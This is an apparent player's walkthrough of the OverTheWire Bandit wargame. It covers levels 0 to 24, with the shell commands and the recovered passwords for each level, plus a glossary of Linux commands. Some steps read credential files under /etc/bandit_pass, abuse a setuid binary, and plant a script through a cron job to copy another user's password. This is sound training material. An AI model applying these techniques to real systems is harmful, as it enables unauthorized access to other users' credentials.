# overTheWire Game - Bandit

- level 0:

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
```

password: bandit0

- level 0-1:

```bash
cat readme
password: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
```

- level 1-2:

```bash
cat < -
password: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
```

- level 2-3:

```bash
cat <"spaces in this filename"
password: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
```

- level 3-4:

```bash
find
cat <./...Hiding-From-You
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
```

- level 4-5:

```bash
cd inhere/
file ./-file00 ./-file01 ./-file02 ./-file03 ./-file04 ./-file05 ./-file06 ./-file07 ./-file08 ./-file09  cat <-file07
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
```

- Level 5-6:

```bash
cd inhere/
# Use the find Command to locate files with the specified properties:
# -type f: to find regular files
# -size 1033c: to find files that are exactly 1033 bytes in size
# ! -executable: to exclude executable files
# Use the -exec file {} + option to check the file type for human-readability
find . -type f -size 1033c ! -executable -exec file {} + | grep "ASCII text"
cat <./maybehere07/.file2
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
```

- Level 6-7:

```bash
# Use the find Command:
# -user bandit7: to find files owned by user bandit7
# -group bandit6: to find files owned by group bandit6
# -size 33c: to find files that are exactly 33 bytes in size
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
# This command searches from the root directory (/) and filters out error messages (using 2>/dev/null to suppress permission denied errors).
cat </var/lib/dpkg/info/bandit7.password
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
```

- level 7-8:

```bash
grep “millionth” data.txt
millionth dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
```

- level 8-9:

```bash
sort data.txt | uniq -u
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
```

- Level 9-10:

```bash
strings data.txt | grep "=="
FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
```

- Level 10-11:

```bash
base64 --decode data.txt
The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
```

- Level 11-12:

```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
```

-Level 12-13:

```bash
# Create a temporary directory:
TEMP_DIR=$(mktemp -d)
# Navigate to the temporary directory:
cd $TEMP_DIR
# copy data.txt to the temporary directory:
cp /home/bandit12/data.txt $TEMP_DIR/data.txt
# Identify the file type:
file data.txt
# Reverse the hexdump to a binary file:
xxd -r data.txt data.bin
 #Identify the file type:
file data.bin
# Rename the binary file to a gzip file:
mv data.bin data.gz
# Decompress the gzip file:
gzip -d data.gz
# Identify the file type again:
file data
mv data data.bz2
bzip2 -d data.bz2
mv data data.gz
gzip -d data.gz
# Extract the tar archive:
tar -xf data
tar -xf data5.bin
mv data6.bin data6.bz2
 #Decompress the bzip2 file:
bzip2 -d data6.z2
tar -xf data6
# Rename and decompress the gzip file:
mv data8.bin data8.gz
gzip -d data8.gz
# Read the final uncompressed file
cat data8
The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
```

- Level 13-14:

```bash
# Use the SSH private Key to Log into Bandit14:
ssh -i sshkey.private bandit14@localhost -p 2220
# Read the Password from the Specified File:
cat /etc/bandit_pass/bandit14
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
```

- Level 14-15:

```bash
# Use the nc command to open a connection to port 30000 on localhost; Send the current level's password to the port.
# The echo command prints the current level's password
# The pipe (|) takes the output of the echo command and sends it as input to the nc command.
# nc (netcat) connects to localhost on port 30000 and sends the password.
echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```

- Level 15-16:

```bash
# Use the openssl s_client command to open a secure connection to port 30001 on localhost.
# openssl s_client:The command to initiate an SSL/TLS connection.
# -connect localhost:30001: Specifies the server and port to connect to.
# -ign_eof: Ignores the end of file (EOF) from the server, which might be necessary to prevent the connection from closing prematurely.
openssl s_client -connect localhost:30001 -ign_eof
# Enter the last level password:
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
# Server will send the new password:
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
```

- Level 16-17:

```bash
# Scan Ports to Find Open Ports:
nmap -p 31000-32000 localhost
# For each open port identified (in this case 31790), use ncat to check if the port supports SSL:
ncat --ssl localhost 31790
# then insert the password of the last level:
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
# get the private key:
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2...(continue)
-----END RSA PRIVATE KEY-----
# create a temp file:
cd /tmp
touch pvt16.key
# Open the file in a text editor (e.g., nano) and paste the private key into it
nano pvt6.key
# change permissions:
chmod 700 pvt16.key
# confirm the permission was changed:
ls -l pvt16.key
# login level 17 with the private key:
ssh -i pvt16.key bandit17@localhost -p 2220
```

- Level 17-18:

```bash
diff passwords.old passwords.new
# you will get the old and the new password
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
```

- Level 18-19:
  For this level we need to access through other shell because someone edit the bash. To do that, first find our shell options:

```bash
cat /etc/shells
#choose one and login with it:
ssh bandit18@bandit.labs.overthewire.org -p 2220 -t "/bin/sh"
# insert the last password:
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
# get the password through readme:
cat readme
cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
```

- Level 19-20:
  A setuid (Set User ID) binary is an executable file with a special permission that allows users to run the binary with the privileges of the file's owner.

```bash
# List and Identify the setuid binary:
ls -l
# Execute the setuid binary without arguments:
./bandit20-do
# Use the setuid binary to read the password file:
./bandit20-do cat /etc/bandit_pass/bandit20
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```

- Level 20-21:

```bash
# The binary suconnect is the setuid binary
ls -l
-rwsr-x--- 1 bandit21 bandit20 15604 Jun 20 04:07 suconnect
# Open the first terminal session and set up the network listener using nc:
echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l -p 12345
# use screen to manage multiple terminal sessions:
screen
# Press Ctrl+A then C to create a new window; Run the setuid binary:
./suconnect 12345
# Use Ctrl+A then N or P to navigate between the windows; Get the password in one of the windows:
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```

- Level 21-22:

```bash
cd /etc/cron.d/
ls
# Identify the relevant cron job file: cronjob_bandit22 because we want to go to level 22
cat cronjob_bandit22
# the cron job file shows the script that is executed at regular intervals
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
# The script /usr/bin/cronjob_bandit22.sh is examined to understand what it does.
cat /usr/bin/cronjob_bandit22.sh
#The script copies the contents of the password file to a temporary location.
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
# The password is stored in the temporary file created by the script.
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
# password:
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

- Level 22-23:

```bash
cd /etc/cron.d/
cat cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
myname=$andit23
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

- Level 23-24:

```bash
cd /etc/cron.d/
ls
# This file shows the cron job configuration for the bandit24 user:
cat cronjob_bandit24
# This script is run by the cron job and contains the logic that handles scripts in the /var/spool/bandit24/foo directory:
cat /usr/bin/cronjob_bandit24.sh
# the content inside this file:
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; #The script loops through all files in the directory
do
    if [ "$i" != "." -a "$i" != ".." ]; #It ignores the . and .. entries
    then
        echo "Handling $i" #It prints a message for each file being handled.
        owner="$(stat --format "%U" ./$i)" #It checks if the file is owned by bandit23
        if [ "${owner}" = "bandit23" ]; then #If the file is owned by bandit23, it executes the file with a timeout of 60 seconds.
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i #Finally, it deletes the file.
    fi
done

# This is a writable directory where you can create your script:
cd /tmp/rand
# Create an empty script file script.sh:
touch script.sh
# This command attempts to open the script file in the nano text editor for editing:
nano script.sh
touch password
# the content of the script:
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/rand/password

# This ensures that the script and the password file can be accessed and modified as needed:
chmod 777 -R /tmp/rand
# This moves your script into the directory where the cron job will execute it:
cp script.sh /var/spool/bandit24/foo
ls -l
cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

# COMMANDS:

ssh username@host -p PORT
ls: Lists files and directories in the current directory.
cd [directory]: Changes the current directory to the specified one.
cat [file]: Displays the contents of the specified file.
file [file]: Determines the type of the specified file.
du [file]: Estimates file space usage.
find [path] [expression]: Searches for files in a directory hierarchy based on the specified criteria.
man: Displays the manual page for a command, providing detailed information about its usage and options.
grep: Searches for patterns within text files and prints the matching lines.
sort: Sorts lines of text files in alphabetical or numerical order.
uniq: Filters out repeated lines from a sorted file, displaying only unique lines.
strings: Extracts and prints printable strings from binary files.
base64: Encodes or decodes data in Base64 encoding.
tr: Translates or deletes characters from the input based on specified criteria.
tar: Archives multiple files into a single tarball and can extract files from an archive.
gzip: Compresses files using the GNU zip algorithm.
bzip2: Compresses files using the Burrows-Wheeler block sorting text compression algorithm.
xxd: Creates a hex dump of a given file or can reverse a hex dump back into the original binary.
mv: Moves or renames files or directories from one location or name to another.
mkdir: Creates a new directory with the specified name.
cp: Copies files or directories from one location to another.
telnet: Connects to remote hosts using the Telnet protocol, typically for testing and debugging network services.
nc (netcat): A versatile networking utility for reading from and writing to network connections using TCP or UDP.
openssl: A toolkit for the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) protocols, and a general-purpose cryptography library.
openssl s_client: A diagnostic tool for connecting to SSL/TLS services to test and debug them.
nmap: A network scanning tool used to discover hosts and services on a network by sending packets and analyzing the responses.
chown: Changes the ownership of files or directories to a specified user and/or group.
chmod: Changes the permissions of files or directories, specifying what users can read, write, or execute.
whoami: print user name.
touch: Creates an empty file if it doesn't exist or updates the last modified timestamp of the file if it does.
ncat: A versatile networking tool for reading from and writing to network connections using TCP or UDP, with optional SSL support.
diff: Compares files line by line and outputs the differences.
screen: A terminal multiplexer that allows multiple shell sessions within a single terminal window.
tmux: A terminal multiplexer that enables multiple terminal sessions to be accessed and controlled from a single screen.
pwd: print working directory (see the current directory).
whatis: displays a brief description of a specified command or program.

Unix ‘job control’:

- bg: Resumes a suspended job in the background.
- fg: Brings a background job to the foreground.
- jobs: Lists active jobs.
- &: Runs a command in the background.
